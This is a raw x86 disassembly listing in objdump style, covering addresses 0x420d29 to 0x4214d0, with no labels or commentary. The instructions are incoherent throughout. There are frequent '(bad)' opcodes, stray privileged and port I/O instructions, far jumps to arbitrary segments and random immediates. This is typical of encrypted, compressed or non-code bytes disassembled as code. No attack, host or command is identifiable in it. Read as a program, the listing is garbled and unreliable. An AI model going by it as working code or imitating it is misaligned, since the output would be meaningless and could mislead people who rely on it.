  420d29:	es adc ah,bl
  420d2c:	iret   
  420d2d:	xor    eax,0x51bfc353
  420d32:	(bad)  
  420d33:	fbstp  TBYTE PTR [ecx+0x481e2aab]
  420d39:	mov    cl,bh
  420d3b:	cmp    DWORD PTR [ebx+0x59],edi
  420d3e:	sbb    dl,BYTE PTR [ebp+0x2]
  420d41:	out    dx,al
  420d42:	pop    ds
  420d43:	adc    ebx,DWORD PTR [ecx]
  420d45:	mov    edx,0x6407cd14
  420d4a:	inc    ebp
  420d4b:	fdecstp 
  420d4d:	pop    edi
  420d4e:	mov    al,ds:0xa893a4be
  420d53:	push   esp
  420d54:	add    DWORD PTR [eax],ebp
  420d56:	test   al,al
  420d58:	sbb    DWORD PTR [esi],edi
  420d5a:	xlat   BYTE PTR ds:[ebx]
  420d5b:	or     BYTE PTR [ebp+0x74],cl
  420d5e:	mov    ch,BYTE PTR [bx]
  420d61:	push   esi
  420d62:	les    ebp,FWORD PTR [edi-0x59]
  420d65:	jne    0x420d84
  420d67:	test   al,0xf8
  420d69:	in     al,dx
  420d6a:	(bad)  
  420d6b:	dec    ecx
  420d6c:	shr    BYTE PTR [ebp-0x12],0xc5
  420d70:	mov    dh,dl
  420d72:	sysexit 
  420d74:	xlat   BYTE PTR ds:[ebx]
  420d75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d76:	cmp    BYTE PTR [edx-0x18],ch
  420d79:	bswap  edi
  420d7b:	fcomp  QWORD PTR ds:0xf828742d
  420d81:	xchg   esp,eax
  420d82:	imul   esp,DWORD PTR [edi+0x67cca23e],0xffffffc6
  420d89:	jle    0x420d1c
  420d8b:	es push 0xfffffff9
  420d8e:	dec    esp
  420d8f:	(bad)  
  420d90:	and    bl,dh
  420d92:	cmp    esp,DWORD PTR [edx]
  420d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420d95:	cmp    eax,0xcaf583eb
  420d9a:	inc    esp
  420d9b:	call   0x66d5:0x2a2d3a4c
  420da2:	mov    al,0x1
  420da4:	not    DWORD PTR [ebx+0x1dce45fb]
  420daa:	pop    edi
  420dab:	cmp    eax,0x875285b0
  420db0:	push   ds
  420db1:	arpl   WORD PTR [ecx+0x4170b37a],cx
  420db7:	sbb    eax,0xdacc80f2
  420dbc:	adc    al,0x34
  420dbe:	out    0x62,al
  420dc0:	fnstcw WORD PTR [edi+0x70b6fa9b]
  420dc6:	xchg   edx,eax
  420dc7:	pop    eax
  420dc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420dc9:	aam    0x3d
  420dcb:	pop    ebp
  420dcc:	ins    DWORD PTR es:[edi],dx
  420dcd:	push   ds
  420dce:	(bad)  
  420dcf:	imul   ecx,DWORD PTR ds:0x3830afb3,0xffffffe0
  420dd6:	mov    ds,WORD PTR [ecx-0xc85072a]
  420ddc:	mov    ebp,DWORD PTR [ebx*2-0x741a1ad3]
  420de3:	or     DWORD PTR [esi],ebx
  420de5:	xchg   ebx,eax
  420de6:	jge    0x420db5
  420de8:	ja     0x420e26
  420dea:	clc    
  420deb:	lods   eax,DWORD PTR ds:[esi]
  420dec:	out    dx,al
  420ded:	sub    al,ch
  420def:	scas   eax,DWORD PTR es:[edi]
  420df0:	sub    dl,BYTE PTR [esi+0x66]
  420df3:	arpl   sp,di
  420df5:	imul   edi,DWORD PTR [ebp+0x3c],0xffffffc3
  420df9:	mov    dl,0x7d
  420dfb:	mov    ?,WORD PTR [edi]
  420dfd:	call   0xc0953bda
  420e02:	pop    esi
  420e03:	out    0x8b,al
  420e05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420e06:	sub    ecx,DWORD PTR [ecx]
  420e08:	and    eax,0xfce6ba4c
  420e0d:	pop    esp
  420e0e:	stc    
  420e0f:	or     DWORD PTR [ebp+0x47bd6ea1],ebp
  420e15:	les    esi,FWORD PTR [ecx+0x43cd6e15]
  420e1b:	sbb    BYTE PTR [ebp+0x1cdb7f11],ah
  420e21:	mov    cl,0xd3
  420e23:	icebp  
  420e24:	test   eax,ebp
  420e26:	mov    ch,0xea
  420e28:	stc    
  420e29:	and    bl,ah
  420e2b:	mov    ds:0x4fb98b27,eax
  420e30:	sbb    al,0x63
  420e32:	adc    ebx,edi
  420e34:	data16 mov ah,ch
  420e37:	add    BYTE PTR [edi],ah
  420e39:	out    0x1b,al
  420e3b:	pop    es
  420e3c:	inc    ebp
  420e3d:	dec    ecx
  420e3e:	mov    edx,0x44944324
  420e43:	sub    BYTE PTR [eax+0x49],dl
  420e46:	jno    0x420e57
  420e48:	add    ch,dl
  420e4a:	test   eax,0xa0c998a4
  420e4f:	xchg   ebp,eax
  420e50:	adc    al,0xc4
  420e52:	push   ecx
  420e53:	pushf  
  420e54:	ret    0x4d79
  420e57:	scas   eax,DWORD PTR es:[edi]
  420e58:	setbe  BYTE PTR [eax+0x5d]
  420e5c:	or     al,ch
  420e5e:	xchg   ecx,eax
  420e5f:	dec    ebp
  420e60:	retf   
  420e61:	lahf   
  420e62:	jno    0x420e97
  420e64:	push   cs
  420e65:	pop    ds
  420e66:	std    
  420e67:	sbb    ah,BYTE PTR [edx+0xe]
  420e6a:	shr    DWORD PTR [ebx+0x30b71bd0],0x12
  420e71:	or     ecx,edx
  420e73:	sbb    BYTE PTR [esi],dh
  420e75:	mov    BYTE PTR [edx+ebp*4-0x52abf9b9],cl
  420e7c:	cld    
  420e7d:	iret   
  420e7e:	add    eax,0xbb1f1a13
  420e83:	dec    edi
  420e84:	sahf   
  420e85:	sti    
  420e86:	bound  ebp,QWORD PTR [ecx]
  420e88:	out    0xd5,eax
  420e8a:	mov    eax,0xde888624
  420e8f:	or     al,0xe6
  420e91:	(bad)  
  420e92:	das    
  420e93:	lds    ebp,FWORD PTR [eax-0x57]
  420e96:	and    eax,0x1b28f2b7
  420e9b:	repz dec ebx
  420e9d:	and    BYTE PTR [ecx+ebx*4],bh
  420ea0:	sahf   
  420ea1:	cmovo  edx,DWORD PTR [ecx]
  420ea4:	mov    esi,0xead49ae7
  420ea9:	xchg   esp,eax
  420eaa:	in     eax,0x96
  420eac:	mov    ah,0x94
  420eae:	mov    ebx,ebp
  420eb0:	jmp    0x96a2:0xd86cba4c
  420eb7:	je     0x420e3f
  420eb9:	jge    0x420f09
  420ebb:	fmul   st(0),st
  420ebd:	adc    bl,ah
  420ebf:	jmp    0x420ee6
  420ec1:	adc    BYTE PTR [ebx],bh
  420ec3:	push   esp
  420ec4:	cmp    ecx,edx
  420ec6:	repz out 0x8e,eax
  420ec9:	imul   ebp,DWORD PTR [ebp+0x19a12ad0],0x919ad6b5
  420ed3:	or     eax,0xc563380a
  420ed8:	repnz (bad) 
  420eda:	xor    eax,0x15d0390b
  420edf:	push   ecx
  420ee0:	stc    
  420ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420ee2:	(bad)  
  420ee3:	sub    DWORD PTR [ebx+0x2d14090e],esp
  420ee9:	sbb    al,0x73
  420eeb:	retf   
  420eec:	pop    esi
  420eed:	ss shl bh,cl
  420ef0:	aam    0xde
  420ef2:	inc    esi
  420ef3:	mov    ecx,0xf5394036
  420ef8:	je     0x420ede
  420efa:	daa    
  420efb:	stos   DWORD PTR es:[edi],eax
  420efc:	lds    edx,FWORD PTR [eax+0x149926cb]
  420f02:	adc    eax,0x6ef9293e
  420f07:	xchg   BYTE PTR [ebx+0x7f],ch
  420f0a:	fwait
  420f0b:	xchg   edx,eax
  420f0c:	xor    DWORD PTR [edx],ecx
  420f0e:	adc    esp,eax
  420f10:	sar    DWORD PTR [eax-0x725cea4d],0xab
  420f17:	push   edi
  420f18:	jnp    0x420f5b
  420f1a:	idiv   BYTE PTR [esp+edx*2]
  420f1d:	enter  0x6234,0x57
  420f21:	mov    esp,DWORD PTR [ecx+0x27]
  420f24:	xchg   ecx,eax
  420f25:	mov    ds:0xad0de088,al
  420f2a:	mov    BYTE PTR [ebx+eax*8],al
  420f2d:	inc    eax
  420f2e:	mov    cl,0xe
  420f30:	xchg   ebp,eax
  420f31:	sar    BYTE PTR [eax-0x6c],0x79
  420f35:	mov    edx,0xa98c29d
  420f3a:	pop    ecx
  420f3b:	icebp  
  420f3c:	mov    dh,cl
  420f3e:	mov    al,0x83
  420f40:	sahf   
  420f41:	mov    esi,0x2caeec69
  420f46:	and    DWORD PTR [ebp+0x278841a],0x37
  420f4d:	jo     0x420ee4
  420f4f:	aad    0x8d
  420f51:	jo     0x420f2b
  420f53:	dec    eax
  420f54:	in     eax,dx
  420f55:	or     BYTE PTR [esi],ch
  420f57:	add    ebx,ecx
  420f59:	dec    esp
  420f5a:	xor    DWORD PTR [ecx+0x771aa75d],esi
  420f60:	stc    
  420f61:	repz mov ebp,0xd7e5c945
  420f67:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420f68:	sar    DWORD PTR [ecx-0x72e7dddc],0x10
  420f6f:	jmp    0xca541742
  420f74:	sahf   
  420f75:	xchg   edx,eax
  420f76:	fisttp DWORD PTR [ecx+esi*8]
  420f79:	daa    
  420f7a:	cli    
  420f7b:	mov    fs,WORD PTR [ebx+0x4dccb683]
  420f81:	add    eax,0x429065bf
  420f86:	dec    esp
  420f87:	ja     0x420f8f
  420f89:	pop    ebx
  420f8a:	mov    DWORD PTR [ecx+0x7322029d],edx
  420f90:	inc    edi
  420f91:	xchg   esi,eax
  420f92:	mov    esp,DWORD PTR [edx+0x1a]
  420f95:	jmp    0x869d:0x2c89d28d
  420f9c:	fdiv   DWORD PTR [edi]
  420f9e:	mov    ecx,0xcc6e9584
  420fa3:	dec    esp
  420fa4:	pop    ebp
  420fa5:	lods   al,BYTE PTR ds:[esi]
  420fa6:	fdiv   QWORD PTR [edx-0x58]
  420fa9:	mov    ebp,0xa7718bf9
  420fae:	push   ecx
  420faf:	lahf   
  420fb0:	fild   DWORD PTR [edi]
  420fb2:	ret    0x7df7
  420fb5:	jg     0x42101c
  420fb7:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  420fb9:	xlat   BYTE PTR ds:[ebx]
  420fba:	xor    DWORD PTR [edx],ecx
  420fbc:	icebp  
  420fbd:	ins    BYTE PTR es:[edi],dx
  420fbe:	in     eax,dx
  420fbf:	dec    eax
  420fc0:	ds test al,0x4a
  420fc3:	outs   dx,DWORD PTR ds:[esi]
  420fc4:	add    eax,0x5337d39e
  420fc9:	sub    edx,DWORD PTR [ebx+0x7ff20f93]
  420fcf:	sar    BYTE PTR [eax+0x5fd1eb61],cl
  420fd5:	xchg   DWORD PTR es:[edx-0x7e2d4793],esp
  420fdc:	xchg   edi,eax
  420fdd:	mov    edi,0x80e0b768
  420fe2:	shl    al,1
  420fe4:	mov    dl,0x4
  420fe6:	sub    esp,eax
  420fe8:	call   0x73cbcfd8
  420fed:	mov    ds:0x1be05675,eax
  420ff2:	adc    eax,0xc1f24e89
  420ff7:	not    DWORD PTR [eax]
  420ff9:	rcl    DWORD PTR [ecx-0x41fa01ba],1
  420fff:	jb     0x420fbf
  421001:	les    esi,FWORD PTR [edi-0x6fb5e38]
  421007:	sbb    BYTE PTR [edx-0x34b015c7],dl
  42100d:	sti    
  42100e:	mov    al,0xf9
  421010:	fnstcw WORD PTR [ebx]
  421012:	cmp    cl,BYTE PTR [ebp+0x46]
  421015:	pushf  
  421016:	pushf  
  421017:	js     0x42108d
  421019:	lods   al,BYTE PTR ds:[esi]
  42101a:	push   ecx
  42101b:	pop    ebp
  42101c:	iret   
  42101d:	into   
  42101e:	std    
  42101f:	popa   
  421020:	aaa    
  421021:	pop    ebx
  421022:	dec    BYTE PTR ds:0xefd10659
  421028:	je     0x420fe8
  42102a:	sub    ecx,DWORD PTR [ecx]
  42102c:	fwait
  42102d:	jno    0x4210a8
  42102f:	push   edi
  421030:	movd   mm3,DWORD PTR ds:0xcfdec70d
  421037:	add    esi,edx
  421039:	pop    edx
  42103a:	aam    0x48
  42103c:	scas   eax,DWORD PTR es:[edi]
  42103d:	mov    ah,0xe6
  42103f:	inc    edi
  421040:	out    dx,eax
  421041:	test   al,0xac
  421043:	jl     0x42106a
  421045:	fimul  WORD PTR [ecx+0x5d56e70f]
  42104b:	xlat   BYTE PTR ds:[ebx]
  42104c:	and    BYTE PTR [ebp-0x47],ah
  42104f:	xchg   esi,eax
  421050:	sub    BYTE PTR [ebx-0x16],dh
  421053:	push   ds
  421054:	ins    DWORD PTR es:[edi],dx
  421055:	jnp    0x421019
  421057:	mov    esp,0x5c1c8f6d
  42105c:	jmp    0x42101b
  42105e:	adc    al,0xf9
  421060:	or     bl,al
  421062:	mov    WORD PTR [eax-0x1b668de9],fs
  421068:	mov    WORD PTR [edx+0x72],?
  42106b:	fidiv  DWORD PTR [ebx-0x12444dd1]
  421071:	dec    ebp
  421072:	xchg   esp,eax
  421073:	pop    ds
  421074:	pop    ss
  421075:	dec    edi
  421076:	push   edx
  421077:	test   eax,0x19f4f7
  42107c:	clc    
  42107d:	(bad)  
  42107f:	jne    0x4210f8
  421081:	clc    
  421082:	stos   DWORD PTR es:[edi],eax
  421083:	push   0xffffffd5
  421085:	fnsave [edi+0x38781c39]
  42108b:	and    al,0xa2
  42108d:	mov    eax,0xee3ddcf6
  421092:	imul   ecx,DWORD PTR [edi-0xb2cc62f],0xd02097c6
  42109c:	out    dx,al
  42109d:	mov    dl,0xeb
  42109f:	add    ah,BYTE PTR [edi+0x51]
  4210a2:	pop    edx
  4210a3:	repnz (bad) 
  4210a6:	pusha  
  4210a7:	mov    esi,0x938962c5
  4210ac:	mov    edi,0x74396a73
  4210b1:	and    cl,ch
  4210b3:	xchg   ebp,eax
  4210b4:	xchg   BYTE PTR [edi],al
  4210b6:	jno    0x42105c
  4210b8:	imul   esi,DWORD PTR [ebx-0x39],0x7cfe19fe
  4210bf:	xor    al,0xae
  4210c1:	shl    DWORD PTR [ebp+0x2],cl
  4210c4:	icebp  
  4210c5:	into   
  4210c6:	xlat   BYTE PTR ds:[ebx]
  4210c7:	mov    esp,0x87f76cba
  4210cc:	in     eax,0x1e
  4210ce:	ins    DWORD PTR es:[edi],dx
  4210cf:	jo     0x421081
  4210d1:	sub    al,dl
  4210d3:	sub    cl,BYTE PTR [ecx+0x7b]
  4210d6:	xlat   BYTE PTR ds:[ebx]
  4210d7:	and    al,0x2d
  4210d9:	std    
  4210da:	or     BYTE PTR [edx],ch
  4210dc:	sbb    BYTE PTR [ebp-0x11],0x67
  4210e0:	enter  0x3d7a,0x1f
  4210e4:	fnsetpm(287 only) 
  4210e6:	inc    esi
  4210e7:	test   BYTE PTR [edx+0x14ccb41],0xfa
  4210ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4210ef:	xor    ebx,DWORD PTR [esi+0x551b170f]
  4210f5:	adc    BYTE PTR [ebp+0x1f],cl
  4210f8:	xchg   ebp,eax
  4210f9:	xor    al,0xe2
  4210fb:	repnz fs mov dh,0x3
  4210ff:	dec    ebx
  421100:	mov    ebx,0x357a1f8e
  421105:	dec    ecx
  421106:	jge    0x42112f
  421108:	pushf  
  421109:	or     ebp,DWORD PTR [eax+0x4]
  42110c:	ds inc esi
  42110e:	arpl   WORD PTR [edx-0x2329d79e],di
  421114:	pop    ecx
  421115:	xor    edx,esi
  421117:	in     eax,dx
  421118:	lods   eax,DWORD PTR ds:[esi]
  421119:	sbb    ecx,ecx
  42111b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42111c:	adc    dl,BYTE PTR [eax+0x7a866d79]
  421122:	ss int3 
  421124:	rcr    BYTE PTR [ecx-0x35c24d3c],0xa5
  42112b:	cmp    BYTE PTR [edx-0x28],cl
  42112e:	xchg   edi,eax
  42112f:	stos   BYTE PTR es:[edi],al
  421130:	nop
  421131:	jns    0x42119a
  421133:	push   ecx
  421134:	int    0x5
  421136:	mov    bh,0x27
  421138:	jmp    0x7f9:0x92c3d270
  42113f:	xor    DWORD PTR [ecx+0x71],edi
  421142:	out    0x88,al
  421144:	sbb    DWORD PTR [ecx+0x11],edi
  421147:	loope  0x4211a6
  421149:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42114a:	pop    ebp
  42114b:	fwait
  42114c:	enter  0x7f48,0xb
  421150:	test   al,0x6
  421152:	adc    bh,ah
  421154:	std    
  421155:	sub    cl,dl
  421157:	fst    QWORD PTR [edx+0x60]
  42115a:	xlat   BYTE PTR ds:[ebx]
  42115b:	mov    ds:0x9ed9d5bf,al
  421160:	out    0x23,al
  421162:	aad    0x80
  421164:	cmp    al,0xb4
  421166:	lods   al,BYTE PTR ds:[esi]
  421167:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421168:	inc    ebx
  421169:	aas    
  42116a:	rcl    BYTE PTR [eax+0x29],1
  42116d:	dec    ebp
  42116e:	ss aad 0xc5
  421171:	popa   
  421172:	adc    ah,BYTE PTR [eax]
  421174:	les    ecx,FWORD PTR [ecx+0x2e]
  421177:	fadd   DWORD PTR [ebx+edx*4]
  42117a:	les    eax,FWORD PTR [ebx+0x17dbceab]
  421180:	inc    esp
  421181:	icebp  
  421182:	fcomp  QWORD PTR [ebp-0x2d]
  421185:	cmp    ah,cl
  421187:	pop    ebp
  421188:	loop   0x4211f8
  42118a:	les    esp,FWORD PTR [ecx-0x2e]
  42118d:	mov    al,0xd1
  42118f:	push   edi
  421190:	outs   dx,BYTE PTR ds:[esi]
  421191:	ret    0xd1c8
  421194:	jmp    0x712ff846
  421199:	fidiv  WORD PTR [eax+0x4a]
  42119c:	push   cs
  42119d:	pop    ebp
  42119e:	iret   
  42119f:	and    BYTE PTR [edi],bh
  4211a1:	inc    esp
  4211a2:	mov    esp,eax
  4211a4:	jo     0x421135
  4211a6:	jg     0x4211fc
  4211a8:	mov    ds:0xab471f27,al
  4211ad:	icebp  
  4211ae:	dec    edi
  4211af:	leave  
  4211b0:	xor    eax,0xb0a67c7c
  4211b5:	dec    ebx
  4211b6:	ins    DWORD PTR es:[edi],dx
  4211b7:	sbb    BYTE PTR [ebx+ebp*8],bh
  4211ba:	mov    cl,0x21
  4211bc:	mov    al,ds:0x8d136b2b
  4211c1:	jmp    0x42119a
  4211c3:	add    DWORD PTR [ecx],0x26861bb
  4211c9:	or     DWORD PTR [ecx-0x1bb17683],esi
  4211cf:	adc    eax,0xeb49e4bb
  4211d4:	jae    0x421196
  4211d6:	sub    DWORD PTR [esi-0x4],edi
  4211d9:	xchg   esi,eax
  4211da:	push   ss
  4211db:	fcompp 
  4211dd:	mov    cl,BYTE PTR [ebx]
  4211df:	or     eax,0xb70686ee
  4211e4:	and    al,0xaf
  4211e6:	test   al,al
  4211e8:	aas    
  4211e9:	jb     0x421228
  4211eb:	and    al,0x63
  4211ed:	mov    WORD PTR [ecx+ecx*1+0x12],fs
  4211f1:	or     eax,0xcb8cb076
  4211f6:	pop    ecx
  4211f7:	sbb    edx,edx
  4211f9:	es xor eax,0x39cf7756
  4211ff:	cmp    al,0x50
  421201:	xor    ebp,0xc2272dad
  421207:	xchg   ecx,edx
  421209:	imul   ecx,DWORD PTR [edi+0x72],0x69
  42120d:	test   DWORD PTR [esp+eax*4-0x76],edx
  421211:	inc    edx
  421212:	push   es
  421213:	mov    al,ds:0xc2cf7664
  421218:	pop    ecx
  421219:	cmp    BYTE PTR [eax],bh
  42121b:	lods   eax,DWORD PTR ds:[esi]
  42121c:	mov    edx,0xdb535312
  421221:	mov    ecx,0xd0b6e77f
  421226:	push   ebp
  421227:	out    dx,al
  421228:	mov    ebx,0x3f713d3a
  42122d:	mov    eax,ds:0xf570d365
  421232:	sub    BYTE PTR [edi],bh
  421234:	jnp    0x42124d
  421236:	sbb    esi,ebx
  421238:	sub    ah,BYTE PTR [esi]
  42123a:	aaa    
  42123b:	fdivr  DWORD PTR [ecx+0xd]
  42123e:	xchg   ecx,eax
  42123f:	push   ebp
  421240:	ins    DWORD PTR es:[edi],dx
  421241:	imul   ebp,ecx,0x6d
  421244:	loope  0x4212af
  421246:	mov    eax,0x44016455
  42124b:	(bad)  
  42124c:	jbe    0x42126d
  42124e:	push   es
  42124f:	mul    BYTE PTR [eax]
  421251:	add    edi,esp
  421253:	push   ds
  421254:	fstp   QWORD PTR [ebx+0x1093bb3e]
  42125a:	or     eax,0x40517bbc
  42125f:	(bad)  
  421260:	loope  0x42129d
  421262:	pcmpeqw mm1,QWORD PTR [ecx-0x37]
  421266:	push   eax
  421267:	cli    
  421268:	push   ss
  421269:	cli    
  42126a:	pop    esp
  42126b:	adc    ah,BYTE PTR [esi+0xc]
  42126e:	mov    dl,0x78
  421270:	push   eax
  421271:	xor    dh,cl
  421273:	outs   dx,BYTE PTR ds:[esi]
  421274:	add    eax,0x643f75d6
  421279:	push   0x540534b8
  42127e:	mov    bh,0x2e
  421280:	mov    bh,0xa9
  421282:	dec    eax
  421283:	(bad)  
  421286:	ja     0x421294
  421288:	cdq    
  421289:	retf   
  42128a:	adc    al,0xc9
  42128c:	jnp    0x421245
  42128e:	sbb    BYTE PTR ds:0x494bcd4,dh
  421294:	pop    esp
  421295:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421296:	and    ecx,eax
  421298:	ja     0x421241
  42129a:	popa   
  42129b:	retf   
  42129c:	fcmove st,st(5)
  42129e:	(bad)  
  42129f:	mov    edx,0x78c45a30
  4212a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212a5:	loope  0x42126a
  4212a7:	aam    0xf7
  4212a9:	jne    0x42124c
  4212ab:	mov    ebx,0x910088bf
  4212b0:	imul   eax,DWORD PTR [edi],0xadbc02cb
  4212b6:	sub    dh,BYTE PTR [ecx-0x11280ebc]
  4212bc:	pop    eax
  4212bd:	shl    DWORD PTR [ebp+0x7e],cl
  4212c0:	xor    eax,0x7e798ff2
  4212c5:	cmp    DWORD PTR ds:0xb6ce00d9,0x59a24d15
  4212cf:	cmp    DWORD PTR [esp+ebp*2],0x50068fc4
  4212d6:	xchg   esi,eax
  4212d7:	inc    edi
  4212d8:	or     esp,DWORD PTR [ebp+0x4862bee2]
  4212de:	fisttp WORD PTR [edx-0x73]
  4212e1:	add    DWORD PTR [ebp+0x4d9a5bb1],ebx
  4212e7:	pop    ds
  4212e8:	pop    ecx
  4212e9:	test   BYTE PTR [ebp+0x62],dl
  4212ec:	mov    WORD PTR [edx-0x5028b24f],gs
  4212f2:	pop    edi
  4212f3:	sub    esi,DWORD PTR [esi+0x2b]
  4212f6:	mov    ds:0x52d46c46,al
  4212fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4212fc:	or     esi,DWORD PTR [edx]
  4212fe:	fcom   DWORD PTR [ebp-0x455c4cf9]
  421304:	pop    ds
  421305:	xlat   BYTE PTR ds:[ebx]
  421306:	retf   0x1bd
  421309:	and    dl,ah
  42130b:	adc    BYTE PTR [ebp+edx*8+0x10357584],al
  421312:	add    al,BYTE PTR [eax-0x10]
  421315:	and    dh,BYTE PTR [edx-0x6b]
  421318:	loope  0x4212c6
  42131a:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  42131c:	push   ecx
  42131d:	test   eax,0xc8580c5d
  421322:	and    DWORD PTR [esi],ebx
  421324:	neg    ebx
  421326:	not    edi
  421328:	clc    
  421329:	je     0x421315
  42132b:	xchg   edx,eax
  42132c:	push   ss
  42132d:	int3   
  42132e:	mov    edx,0x5447a6fa
  421333:	and    DWORD PTR [edi-0x62a1b218],edi
  421339:	push   ecx
  42133a:	and    BYTE PTR [esi+0x43],ah
  42133d:	je     0x42131d
  42133f:	sar    BYTE PTR [ebx],cl
  421341:	mov    bh,0xb7
  421343:	leave  
  421344:	add    eax,0xcc2124ab
  421349:	(bad)  
  42134a:	out    0xb6,eax
  42134c:	dec    edx
  42134d:	retf   0xc057
  421350:	sbb    eax,0xe657056f
  421356:	fiadd  WORD PTR [edx+0x4e3f046b]
  42135c:	sub    bl,dl
  42135e:	jge    0x421337
  421360:	addr16 or al,0x1e
  421363:	daa    
  421364:	aaa    
  421365:	xchg   edi,eax
  421366:	popf   
  421367:	fwait
  421368:	popf   
  421369:	in     eax,dx
  42136a:	sbb    al,0x55
  42136c:	sub    al,ah
  42136e:	sti    
  42136f:	xor    bh,BYTE PTR [ebp-0x2a]
  421372:	xchg   edi,eax
  421373:	stc    
  421374:	mov    bl,0x45
  421376:	inc    ebx
  421377:	data16 stos BYTE PTR es:[edi],al
  421379:	sbb    al,0x72
  42137b:	bound  edx,QWORD PTR [esi-0x58]
  42137e:	div    DWORD PTR [esi+ebp*8]
  421381:	imul   esi,DWORD PTR [ebp-0x15],0x817c6257
  421388:	push   edi
  421389:	push   ds
  42138a:	shr    BYTE PTR [ebx+0x6a],cl
  42138d:	jmp    0x25e1673c
  421392:	nop
  421393:	push   ebp
  421394:	xchg   edi,eax
  421395:	sub    eax,0x29e0a02a
  42139a:	jae    0x4213e2
  42139c:	mov    eax,0xdd2576c7
  4213a1:	xchg   esp,eax
  4213a2:	fdivr  DWORD PTR [ebp+0x2789149b]
  4213a8:	dec    ebp
  4213a9:	jp     0x42141f
  4213ab:	dec    ecx
  4213ac:	leave  
  4213ad:	scas   al,BYTE PTR es:[edi]
  4213ae:	sub    ecx,DWORD PTR [edi+eax*8+0x1b95a163]
  4213b5:	mov    WORD PTR [esi+0x4c],es
  4213b8:	push   esi
  4213b9:	(bad)  
  4213ba:	mov    dh,0xb6
  4213bc:	aad    0x3
  4213be:	fld    DWORD PTR [eax+0x4ce2dbab]
  4213c4:	mov    eax,ds:0xd920ac3b
  4213c9:	xchg   esi,eax
  4213ca:	repnz stos DWORD PTR es:[edi],eax
  4213cc:	or     dl,BYTE PTR [edi+ebx*1+0x7d85b7ed]
  4213d3:	cmp    eax,0x79623396
  4213d8:	repz clc 
  4213da:	test   BYTE PTR [ebx],bh
  4213dc:	aad    0xa9
  4213de:	sbb    ah,BYTE PTR [esi]
  4213e0:	ror    BYTE PTR [eax-0x60a51308],cl
  4213e6:	pop    edx
  4213e7:	jge    0x4213f8
  4213e9:	aas    
  4213ea:	scas   al,BYTE PTR es:[edi]
  4213eb:	mov    ebp,0x61caa974
  4213f0:	pop    ss
  4213f1:	adc    BYTE PTR [edi],ah
  4213f3:	push   ebp
  4213f4:	push   ecx
  4213f5:	mov    cl,BYTE PTR [edx-0x733766f5]
  4213fb:	push   0x257c6f3
  421400:	dec    ebp
  421401:	push   edi
  421402:	iret   
  421403:	add    ch,BYTE PTR [esi]
  421405:	xchg   ebp,eax
  421406:	jae    0x421390
  421408:	pusha  
  421409:	push   edi
  42140a:	(bad)  
  42140b:	fst    QWORD PTR [ebx]
  42140d:	aas    
  42140e:	(bad)  [ecx+0x5f]
  421411:	shl    DWORD PTR [ebx],1
  421413:	pop    esi
  421414:	retf   0x6635
  421417:	fdiv   DWORD PTR [eax]
  421419:	dec    ebx
  42141a:	or     BYTE PTR [esi],bh
  42141c:	popf   
  42141d:	push   edi
  42141e:	cdq    
  42141f:	dec    esp
  421420:	pop    eax
  421421:	dec    ebx
  421422:	je     0x42143e
  421424:	add    BYTE PTR es:[edi-0x430c3843],bl
  42142b:	push   ebx
  42142c:	inc    ebp
  42142d:	bound  ebx,QWORD PTR [edi]
  42142f:	in     al,dx
  421430:	in     al,0x8c
  421432:	je     0x421407
  421434:	popf   
  421435:	or     bh,BYTE PTR [edx]
  421437:	fs xchg ebx,eax
  421439:	ret    
  42143a:	ins    DWORD PTR es:[edi],dx
  42143b:	sahf   
  42143c:	xor    ecx,ebp
  42143e:	adc    al,0x8d
  421440:	and    BYTE PTR [ecx+0x68ab0193],bh
  421446:	xlat   BYTE PTR ds:[ebx]
  421447:	mov    esp,0x261cac2c
  42144c:	pop    edi
  42144d:	sahf   
  42144e:	les    edi,FWORD PTR [edi-0x7e]
  421451:	sar    DWORD PTR [ebx-0x7259424e],0x5
  421458:	leave  
  421459:	pop    ebp
  42145a:	lods   al,BYTE PTR ds:[esi]
  42145b:	scas   al,BYTE PTR es:[edi]
  42145c:	lods   al,BYTE PTR ds:[esi]
  42145d:	inc    esi
  42145e:	sub    BYTE PTR [edx+0x65],ah
  421461:	test   BYTE PTR [ebx],ch
  421463:	sub    eax,0x352f5478
  421468:	mov    ch,0xb4
  42146a:	add    al,0x12
  42146c:	pop    edi
  42146d:	push   esp
  42146e:	mov    edx,0x81e7ce43
  421473:	sbb    BYTE PTR [ebp-0x58baa827],bh
  421479:	add    ah,BYTE PTR [ecx-0x6a]
  42147c:	inc    edx
  42147d:	popa   
  42147e:	cdq    
  42147f:	(bad)  
  421480:	retf   0xc64e
  421483:	in     al,dx
  421484:	ret    
  421485:	(bad)  
  421486:	out    dx,eax
  421487:	and    al,0x31
  421489:	adc    BYTE PTR [esi],cl
  42148b:	xor    BYTE PTR [esi+esi*8-0x79195c63],ah
  421492:	imul   edx,DWORD PTR [ebx+0x332fcedf],0x2f
  421499:	scas   eax,DWORD PTR es:[edi]
  42149a:	pop    edi
  42149b:	jecxz  0x42143b
  42149d:	popa   
  42149e:	push   esp
  42149f:	retf   
  4214a0:	cmp    al,0x96
  4214a2:	add    esi,DWORD PTR [edi-0x3e6cd353]
  4214a8:	and    DWORD PTR [eax-0x54],edx
  4214ab:	push   cs
  4214ac:	xchg   edi,eax
  4214ad:	imul   esi,edx,0xca63d2f0
  4214b3:	(bad)  
  4214b4:	mov    edx,0x47ded761
  4214b9:	call   0x6ae66938
  4214be:	stos   BYTE PTR es:[edi],al
  4214bf:	cli    
  4214c0:	inc    ecx
  4214c1:	in     eax,0x75
  4214c3:	ficom  DWORD PTR [esp+esi*1-0x2]
  4214c7:	mov    ds:0xc3c033d7,eax
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
